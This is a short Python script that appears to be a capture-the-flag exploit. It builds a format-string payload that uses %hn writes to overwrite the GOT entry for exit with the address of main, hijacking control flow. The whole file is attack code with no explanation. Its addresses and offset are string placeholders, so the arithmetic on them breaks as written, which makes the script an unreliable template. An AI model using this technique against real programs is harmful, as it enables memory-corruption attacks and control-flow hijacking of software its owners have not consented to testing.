#!/usr/bin/env python3
import struct, sys

exit_got = "exit_got_slot"
main     = "main_addr"  # eg) 0x080491b6
base     = "offset"

lo = main & 0xffff      # 0x91b6
hi = (main >> 16) & 0xffff  # 0x0804

payload  = struct.pack("<I", exit_got)
payload += struct.pack("<I", exit_got + 2)

count = len(payload)  # 8

pad1 = (lo - count) % 0x10000
payload += f"%{pad1}c%{base}$hn".encode()
count = (count + pad1) % 0x10000

pad2 = (hi - count) % 0x10000
payload += f"%{pad2}c%{base+1}$hn".encode()

payload += b"\n"
sys.stdout.buffer.write(payload)
